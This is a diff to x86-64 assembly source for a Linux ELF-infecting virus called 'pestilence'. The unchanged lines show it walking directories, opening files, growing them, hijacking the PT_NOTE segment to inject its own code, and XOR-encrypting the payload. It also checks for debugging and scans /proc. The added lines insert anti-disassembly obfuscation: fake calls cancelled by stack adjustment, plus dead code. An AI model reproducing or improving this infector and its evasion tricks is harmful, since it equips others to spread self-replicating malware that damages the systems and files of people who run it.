@@ -67,7 +67,17 @@ _start:
 		; Save directory fd in pestilence struct
 		mov VALUE(s_pestilence.dir_fd), rax
 
+; OBFUSCATION - Processor-based Indirection
+call .readDir
+test rax, rsi
+jnz rotativeXOR
+sub dl, al
+ret
+
 .readDir:
+; OBFUSCATION - Negate `call` instruction
+add rsp, 8
+
 		; Get directory entries
 		mov rax, SYSCALL_GETDENTS
 		mov rdi, VALUE(s_pestilence.dir_fd)
@@ -111,8 +121,14 @@ _start:
 		cmp r10, r9
 		jl .loopEntries
 
-		; Reached end of array, get more entries
-		jmp .readDir
+		; Reached end of array, get more entries by jumping to .readDir
+
+; OBFUSCATION - Processor-based Indirection
+call .readDir
+movsb
+xor edx, r8d
+loop .nextDir
+ret
 
 .closeDir:
 		mov rax, SYSCALL_CLOSE
@@ -141,6 +157,13 @@ die:
 		mov rax, SYSCALL_EXIT
 		mov rdi, 0
 		syscall
+
+; OBFUSCATION - This code will never be executed
+call _start
+test rdi, rdi
+xor rax, rax
+mov rdi, 0x7695
+ret
 
 noDebugAllowed:
 		mov rax, SYSCALL_WRITE
@@ -177,7 +200,16 @@ processFile:
 		cmp byte [rsi - 1], 0
 		jnz .copyFileName
 
+; OBFUSCATION - Processor-based Indirection
+call .openFile
+movsb
+test rsi, rsi
+jge processFile
+ret
+
 .openFile:
+; OBFUSCATION - Negate `call` instruction
+add rsp, 8
 		mov rax, SYSCALL_OPEN
 		lea rdi, VALUE(s_pestilence.file_path)
 		mov rsi, O_RDWR
@@ -303,7 +335,17 @@ injectVirus:
 		cmp rax, 0
 		jnz .return
 
+; OBFUSCATION - Processor-based Indirection
+call .enlargeFile
+sub rax, 0x4095
+test rax, r8
+movsb
+ret
+
 .enlargeFile:
+; OBFUSCATION - Negate `call` instruction
+add rsp, 8
+
 		mov rax, SYSCALL_FTRUNCATE
 		mov rdi, VALUE(s_pestilence.file_fd)
 		mov rsi, VALUE(s_pestilence.file_size)
@@ -343,7 +385,15 @@ injectVirus:
 		cmp dword [rdi + elf64_phdr.p_type], PT_NOTE
 		je .editNoteSegment
 
+; OBFUSCATION - Processor-based Indirection
+call .nextSegment
+cmp dword [rdi + 0x23], 0x6
+jz .findNoteSegment
+ret
+
 .nextSegment:
+; OBFUSCATION - Negate `call` instruction
+add rsp, 8
 		add rdi, elf64_phdr_size
 		dec rcx
 		jmp .findNoteSegment
@@ -364,9 +414,18 @@ injectVirus:
 		mov qword [rdi + elf64_phdr.p_filesz], PAGE_SIZE ; Filesz and Memsz => 4096
 		mov qword [rdi + elf64_phdr.p_memsz], PAGE_SIZE
 
+; OBFUSCATION - Processor-based Indirection
+call .injectPayload
+mov rdi, r11
+cmp dword [rdi + 0x23], PAGE_SIZE
+add rdi, [rdi]
+ret
 
 ; Copy PAYLOAD_SIZE bytes from _start to segment end
 .injectPayload:
+; OBFUSCATION - Negate `call` instruction
+add rsp, 8
+
 		mov rdi, r8
 		add rdi, VALUE(s_pestilence.file_size)
 		lea rsi, [rel _start]
@@ -400,8 +459,18 @@ injectVirus:
 		xor rdx, rdx
 		syscall
 
+; OBFUSCATION - Processor-based Indirection
+call .encryptPayload
+test rax, rax
+jnz processFile.copyFileName
+mov rax, -1
+ret
+
 ; RDI => Address of encrytion key
 .encryptPayload:
+; OBFUSCATION - Negate `call` instruction
+add rsp, 8
+
 		mov rdx, [rdi]
 
 		mov rdi, r8
@@ -452,8 +521,18 @@ isDaemon:
 		cmp byte [rsi - 1], 0
 		jnz .copyCommFile
 
+; OBFUSCATION - Processor-based Indirection
+call .openFile
+lea rdx, [rel _end]
+mov r8, PAGE_SIZE
+mov r9, 0x20
+ret
+
 ; Open the 'comm' file
 .openFile:
+; OBFUSCATION - Negate `call` instruction
+add rsp, 8
+
 		mov rax, SYSCALL_OPEN
 		lea rdi, VALUE(s_pestilence.file_path)
 		mov rsi, O_RDONLY
@@ -512,8 +591,19 @@ findDaemonProcess:
 		push r8
 		push r9
 
+; OBFUSCATION - Processor-based Indirection
+call .openDir
+push r10
+lea r10, [r10]
+sbb r9, r8
+inc r10
+ret
+
 ; Open "/proc"
 .openDir:
+; OBFUSCATION - Negate `call` instruction
+add rsp, 8
+
 		mov rax, SYSCALL_OPEN
 		lea rdi, [rel processDirectory]
 		mov rsi, O_RDONLY | O_DIRECTORY
@@ -644,6 +734,13 @@ debugMessage: db "DEBUGGING", 0
 
 ; Encryption ends here
 encryptionEnd:
+
+; OBFUSCATION - This code is never executed
+pop r10
+pop r8
+pop r9
+jmp rax
+ret
 
 ; * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 ; Encrypt part of the payload using XOR encryption with a random rotating key *
